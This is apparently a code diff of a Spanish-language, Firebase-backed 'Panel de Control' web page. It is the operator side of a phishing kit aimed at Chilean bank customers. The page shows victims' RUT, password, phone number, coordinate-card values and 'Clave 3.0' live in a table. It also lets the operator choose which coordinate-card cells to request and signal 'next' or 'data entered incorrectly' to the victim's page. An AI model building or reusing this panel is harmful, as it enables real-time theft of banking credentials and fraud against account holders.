@@ -1,124 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Panel de Control</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background-color: #f5f5f5;
-    }
-    h2 {
-      font-size: 24px;
-      margin-bottom: 20px;
-    }
-    .fila {
-      margin-bottom: 20px;
-    }
-    .switch {
-      position: relative;
-      display: inline-block;
-      width: 60px;
-      height: 30px;
-    }
-    .switch input { display: none; }
-    .slider {
-      position: absolute;
-      cursor: pointer;
-      top: 0; left: 0;
-      right: 0; bottom: 0;
-      background-color: #ccc;
-      transition: .4s;
-      border-radius: 30px;
-    }
-    .slider:before {
-      position: absolute;
-      content: "";
-      height: 22px; width: 22px;
-      left: 4px; bottom: 4px;
-      background-color: white;
-      transition: .4s;
-      border-radius: 50%;
-    }
-    input:checked + .slider {
-      background-color: #4CAF50;
-    }
-    input:checked + .slider:before {
-      transform: translateX(30px);
-    }
-    input[type="text"] {
-      width: 40px;
-      padding: 8px;
-      font-size: 16px;
-      text-align: center;
-      margin-right: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-right: 10px;
-      cursor: pointer;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      background-color: white;
-    }
-    th, td {
-      border: 1px solid #ccc;
-      padding: 8px;
-      text-align: center;
-      font-size: 14px;
-    }
-    th {
-      background-color: #eee;
-    }
+    body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
+    button { margin: 4px; padding: 10px; }
+    table { width: 100%; margin-top: 20px; border-collapse: collapse; background: white; }
+    th, td { padding: 8px; border: 1px solid #ccc; text-align: center; }
+    input.coord { width: 40px; text-align: center; font-size: 16px; margin: 0 5px; }
   </style>
-</head>
-<body>
-  <h2>Panel de Control</h2>
-
-  <div class="fila">
-    <strong>Modo asistente:</strong>
-    <label class="switch">
-      <input type="checkbox" id="modoAsistente">
-      <span class="slider"></span>
-    </label>
-    <span id="estadoModoTexto"></span>
-  </div>
-
-  <div class="fila">
-    <strong>Coordenadas a solicitar:</strong><br><br>
-    <input type="text" id="coord1" maxlength="2" />
-    <input type="text" id="coord2" maxlength="2" />
-    <input type="text" id="coord3" maxlength="2" />
-    <button onclick="actualizarCoordenadas()">Guardar Coordenadas</button>
-  </div>
-
-  <div class="fila">
-    <button onclick="setEstado('siguiente')">✅ Siguiente</button>
-    <button onclick="setEstado('error')">❌ Datos ingresados Incorrectamente</button>
-  </div>
-
-  <div class="fila">
-    <h3>Registros en tiempo real</h3>
-    <table id="tablaRegistros">
-      <thead>
-        <tr>
-          <th>Hora</th>
-          <th>RUT</th>
-          <th>Contraseña</th>
-          <th>Teléfono</th>
-          <th>Coordenadas</th>
-          <th>Clave 3.0</th>
-        </tr>
-      </thead>
-      <tbody id="cuerpoTabla"></tbody>
-    </table>
-  </div>
-
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
@@ -132,51 +23,71 @@
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
 
-    function setEstado(valor) {
-      db.ref("validacion_estado").set(valor);
+    function setModo(valor) {
+      firebase.database().ref("modo_asistente").set(valor);
+    }
+
+    function enviarEstado(valor) {
+      firebase.database().ref("validacion_estado").set(valor);
     }
 
     function actualizarCoordenadas() {
-      const c1 = document.getElementById("coord1").value.trim().toUpperCase();
-      const c2 = document.getElementById("coord2").value.trim().toUpperCase();
-      const c3 = document.getElementById("coord3").value.trim().toUpperCase();
-      const valor = [c1, c2, c3].join(" ");
-      db.ref("coordenadas_solicitadas").set(valor);
+      const c1 = document.getElementById("coord1").value;
+      const c2 = document.getElementById("coord2").value;
+      const c3 = document.getElementById("coord3").value;
+      firebase.database().ref("coordenadas_temporales").set({c1, c2, c3});
     }
 
-    const modoRef = db.ref("modo_asistente");
-    const modoCheck = document.getElementById("modoAsistente");
-    const modoTexto = document.getElementById("estadoModoTexto");
-
-    modoRef.on("value", snap => {
-      const activo = snap.val() === true;
-      modoCheck.checked = activo;
-      modoTexto.textContent = activo ? " (Activo)" : " (Inactivo)";
-    });
-
-    modoCheck.addEventListener("change", () => {
-      modoRef.set(modoCheck.checked);
-    });
-
-    db.ref("registros").on("value", (snapshot) => {
-      const datos = snapshot.val() || {};
-      const cuerpo = document.getElementById("cuerpoTabla");
-      cuerpo.innerHTML = "";
-      Object.values(datos).forEach(d => {
-        const tr = document.createElement("tr");
-        tr.innerHTML = `
-          <td>${d.hora || ""}</td>
-          <td>${d.rut || ""}</td>
-          <td>${d.clave || ""}</td>
-          <td>${d.telefono || ""}</td>
-          <td>${d.coordenadas || ""}</td>
-          <td>${d.clave3 || ""}</td>
-        `;
-        cuerpo.appendChild(tr);
+    function cargarRegistros() {
+      const tabla = document.getElementById("registros");
+      firebase.database().ref("usuarios").on("value", snapshot => {
+        const data = snapshot.val();
+        tabla.innerHTML = "<tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Teléfono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>";
+        for (const key in data) {
+          const row = data[key];
+          const tr = document.createElement("tr");
+          tr.innerHTML = `
+            <td>${row.timestamp || ""}</td>
+            <td>${row.rut || ""}</td>
+            <td>${row.password || ""}</td>
+            <td>${row.telefono || ""}</td>
+            <td>${row.coordenadas || ""}</td>
+            <td>${row.clave3 || ""}</td>
+          `;
+          tabla.appendChild(tr);
+        }
       });
-    });
+    }
+
+    window.onload = cargarRegistros;
   </script>
+</head>
+<body>
+  <h2>Panel de Control</h2>
+
+  <div>
+    <h3>Modo Asistente</h3>
+    <button onclick="setModo('activo')">🔴 Activar</button>
+    <button onclick="setModo('inactivo')">⚪ Desactivar</button>
+  </div>
+
+  <div>
+    <h3>Control de Flujo</h3>
+    <button onclick="enviarEstado('siguiente')">✅ Siguiente</button>
+    <button onclick="enviarEstado('error')">❌ Datos ingresados Incorrectos</button>
+  </div>
+
+  <div>
+    <h3>Coordenadas Solicitadas</h3>
+    <input id="coord1" class="coord" maxlength="2" /> 
+    <input id="coord2" class="coord" maxlength="2" /> 
+    <input id="coord3" class="coord" maxlength="2" />
+    <button onclick="actualizarCoordenadas()">Enviar</button>
+  </div>
+
+  <table id="registros">
+    <tr><th>Fecha</th><th>RUT</th><th>Clave</th><th>Teléfono</th><th>Coordenadas</th><th>Clave 3.0</th></tr>
+  </table>
 </body>
 </html>
